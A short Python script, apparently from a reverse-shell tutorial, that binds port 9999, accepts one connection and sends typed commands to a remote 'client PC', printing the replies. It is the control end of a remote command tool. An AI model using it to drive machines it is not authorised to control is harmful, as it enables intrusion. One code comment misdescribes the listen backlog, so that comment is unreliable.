import socket
import sys

# Creating a socket to connect to computers
def create_socket():
    try:
        global host
        global port
        global s # socket

        host = ''
        port = 9999 # this port is mostly free so we can use it
        s = socket.socket() # socket created
    except socket.error as msg:
        print('Socket creation error: '+str(msg))

# socket opens the line of communication
# port and host will give the info of computer's connection
# binding socket and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s

        print('Binding port'+ str(port))

        s.bind((host, port)) # binding host & port with socket
        s.listen(5) # listening to connections, 5 is no. of bad connections it will tolerate

    except socket.error as msg:
        print('Socket binding error: '+str(msg)+'\n'+'Retrying...')
        bind_socket()

# Establish connection with a client(socket must be listening)
def socket_accept():
    conn, address = s.accept()
    print('Connection Established! |'+ 'IP: '+address[0]+' Port: '+str(address[1]))
    send_command(conn) # sending commands to client PC
    conn.close()

# sending commands to client PC
def send_command(conn):
    while True:
        cmd = input() # to take input from command line
        if cmd == 'quit':
            conn.close() # close the connection
            s.close() # close the socket
            sys.exit()
        if len(str.encode(cmd)) > 0: # we will encode the data into bytes
            conn.send(str.encode(cmd)) # sending the command to client PC

            # storing and printing the client response
            client_response = str(conn.recv(1023), 'utf-8')
            print(client_response)


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
